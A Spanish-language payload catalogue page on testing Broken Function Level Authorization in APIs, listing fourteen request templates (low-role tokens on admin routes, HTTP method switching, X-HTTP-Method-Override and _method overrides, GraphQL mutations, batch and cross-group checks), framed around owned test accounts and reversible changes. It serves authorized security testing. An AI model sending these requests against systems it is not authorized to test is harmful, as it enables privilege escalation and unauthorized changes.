# BFLA: banco ampliado por función, método y rol

> Preparación: dos cuentas propias con roles distintos, objetos de prueba y una operación administrativa reversible. En cada par cambia solo el token, método o ruta señalado. Confirma el efecto desde una cuenta autorizada; un código HTTP aislado no demuestra acceso.

[← Payloads básicos](README.md) · [← Índice ampliado](Catalogo_PATT.md)

## Payloads básicos

### 1. Misma función con rol autorizado y rol bajo

```http
GET /api/admin/v1/test-users/{ID_PROPIO} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ADMIN_PROPIO}

GET /api/admin/v1/test-users/{ID_PROPIO} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO_PROPIO}
```

**Uso:** el segundo token debe ser rechazado aunque el objeto sea propio.

### 2. Función administrativa fuera de /admin

```http
GET /api/v1/test-users/export-summary HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO_PROPIO}
```

**Uso:** las funciones sensibles también pueden residir en rutas ordinarias. Solicita solo un resumen de datos de prueba.

### 3. Escritura y comparación del estado

```http
PATCH /api/v1/test-users/{ID_PROPIO}/status HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO_PROPIO}
Content-Type: application/json

{"status":"test-pending"}
```

**Uso:** prueba un usuario de laboratorio. Comprueba desde el rol administrador si cambió el estado y restáuralo.

### 4. Cambio de método sobre la misma ruta

```text
GET    /api/v1/test-reports/{ID_PROPIO}
POST   /api/v1/test-reports/{ID_PROPIO}
PUT    /api/v1/test-reports/{ID_PROPIO}
PATCH  /api/v1/test-reports/{ID_PROPIO}
DELETE /api/v1/test-reports/{ID_PROPIO}
```

**Uso:** cada línea es una solicitud distinta con rol bajo. Para métodos que modifican o eliminan, usa objetos desechables.

## Payloads por contexto

### 5. Ruta equivalente en otra versión de API

```text
/api/v1/admin/test-users/{ID_PROPIO}
/api/v2/admin/test-users/{ID_PROPIO}
/api/internal/test-users/{ID_PROPIO}
```

**Uso:** prueba solo rutas observadas o documentadas. Compara la política para la misma función.

### 6. Invocación directa sin pasar por la interfaz

```http
POST /api/v1/test-invites/new HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO_PROPIO}
Content-Type: application/json

{"email":"cuenta-controlada@example.test","role":"viewer"}
```

**Uso:** crea una invitación de privilegio mínimo. Comprueba si el backend ejecuta la función aunque la interfaz oculte el botón.

### 7. Mutación GraphQL equivalente

```graphql
mutation {
  prueba: updateTestUserStatus(id:"{ID_PROPIO}", status:"test-pending") {
    id
    status
  }
}
```

**Uso:** adapta al esquema real. Contrasta la autorización de la mutación con REST y con el rol administrador.

### 8. Autorización por elemento de un lote

```json
{"operations":[
  {"type":"read","id":"{ID_PROPIO_1}"},
  {"type":"read","id":"{ID_PROPIO_2}"}
]}
```

**Uso:** los dos objetos pertenecen a cuentas de prueba. Cada acción del lote necesita su propia autorización.

### 9. Rol homónimo en otro grupo

```http
GET /api/v1/test-groups/{GRUPO_B_PROPIO}/settings HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ADMIN_GRUPO_A_PROPIO}
```

**Uso:** un administrador de A no debe administrar B por tener un rol con el mismo nombre.

### 10. Función en otro estado del flujo

```text
POST /api/v1/test-orders/{ID_PROPIO}/approve
POST /api/v1/test-orders/{ID_PROPIO}/refund
POST /api/v1/test-orders/{ID_PROPIO}/close
```

**Uso:** envía una sola solicitud en un estado de prueba donde la función esté prohibida y compárala con un estado permitido.

## Payloads avanzados

### 11. Cabecera de sobrescritura de método

```http
POST /api/v1/test-users/{ID_PROPIO} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO_PROPIO}
X-HTTP-Method-Override: PATCH
Content-Type: application/json

{"status":"test-pending"}
```

**Uso:** solo si el stack admite esta cabecera. Compara PATCH directo, POST normal y POST con sobrescritura.

### 12. Parámetro de sobrescritura de método

```http
POST /api/v1/test-users/{ID_PROPIO}?_method=PATCH HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO_PROPIO}
Content-Type: application/json

{"status":"test-pending"}
```

**Uso:** confirma que el servidor convirtió el método antes de interpretar un cambio de estado.

### 13. Subrecursos con políticas diferentes

```text
GET  /api/v1/test-users/{ID_PROPIO}
GET  /api/v1/test-users/{ID_PROPIO}/audit
POST /api/v1/test-users/{ID_PROPIO}/disable
```

**Uso:** la lectura del usuario no concede permiso para auditoría o desactivación. Compara cada función con el mismo token.

### 14. Confirmación del efecto

```text
1. Registrar estado del objeto propio con rol autorizado.
2. Ejecutar una sola variante con rol bajo.
3. Volver a leer objeto y eventos con rol autorizado.
4. Restaurar el estado si hubo modificación.
```

**Señal:** un 200 sin efecto puede ser falso positivo; un 403 con efecto persistido también importa.

## Fuentes

- [OWASP API5:2023 — Broken Function Level Authorization](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).
- [PortSwigger — Control de acceso y elevación de privilegios](https://portswigger.net/web-security/access-control/).

---

[← Payloads básicos](README.md) · [← Índice ampliado](Catalogo_PATT.md)
